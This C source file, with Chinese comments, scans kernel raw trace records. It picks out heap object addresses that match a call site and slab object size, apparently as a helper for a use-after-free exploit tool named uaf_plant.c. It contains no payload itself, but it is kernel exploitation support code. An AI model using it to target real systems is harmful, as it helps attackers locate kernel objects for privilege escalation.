/*
 * rawscan.c - raw trace 记录扫描（纯计算，可宿主单测）
 *
 * 与 uaf_plant.c 旧版 collect_nth() 的过滤条件**逐字一致**：
 *   - filter_by_site 时，记录起点处的 8 字节必须等于 call_site（needle）；
 *   - req（起点 + 24 处的 bytes_req）必须等于目标 slab 的 object_size；
 *   - ptr（起点 + 8 处）必须是内核地址（高 16 位为 0xFFFF）且 8 字节对齐。
 *
 * 唯一的差别是「怎么读」：旧版把整个 pipe 读完再扫一遍（而且只读 cpu0、
 * 阻塞等满 2 秒）；新版边读边扫，跨块的候选用 tail 衔接。
 */

#include <string.h>

#include "rawscan.h"

void rawscan_init(struct rawscan_state *s, const uint8_t *needle, int filter_by_site,
		  uint64_t req, uint64_t *out, int out_cap, int index)
{
	memset(s, 0, sizeof(*s));
	if (needle)
		memcpy(s->needle, needle, 8);
	s->filter_by_site = filter_by_site;
	s->req = req;
	s->out = out;
	s->out_cap = out_cap;
	s->index = index;
}

void rawscan_feed(struct rawscan_state *s, const uint8_t *data, size_t len)
{
	size_t total, i;

	if (!len)
		return;
	/* 调用方按块喂（≤ RAWSCAN_MAX_CHUNK）。这里兜底截断，避免写爆 scratch。 */
	if (len > RAWSCAN_MAX_CHUNK)
		len = RAWSCAN_MAX_CHUNK;
	total = (size_t)s->tail_n + len;
	memcpy(s->scratch, s->tail, (size_t)s->tail_n);
	memcpy(s->scratch + s->tail_n, data, len);
	for (i = 0; i + 32 <= total; i++) {
		uint64_t ptr, req;
		if (s->filter_by_site && memcmp(s->scratch + i, s->needle, 8))
			continue;
		memcpy(&ptr, s->scratch + i + 8, 8);
		memcpy(&req, s->scratch + i + 24, 8);
		if (req != s->req || (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (s->out && s->out_n < s->out_cap)
			s->out[s->out_n] = ptr;
		if (s->out_n == s->index)
			s->chosen = ptr;
		s->out_n++;
	}
	/*
	 * 留住最后 31 字节：下一块的候选可能从上一块的末尾开始
	 * （记录是按字节逐位试探的，起点可能落在最后 31 字节里）。
	 * 必须是 31 而不是 32 —— 32 会把「上一轮已经扫过的那个起点」再扫一遍，
	 * 命中数就重复计数了。
	 */
	s->tail_n = (int)(total < RAWSCAN_CARRY ? total : RAWSCAN_CARRY);
	memcpy(s->tail, s->scratch + total - s->tail_n, (size_t)s->tail_n);
	s->bytes += len;
}
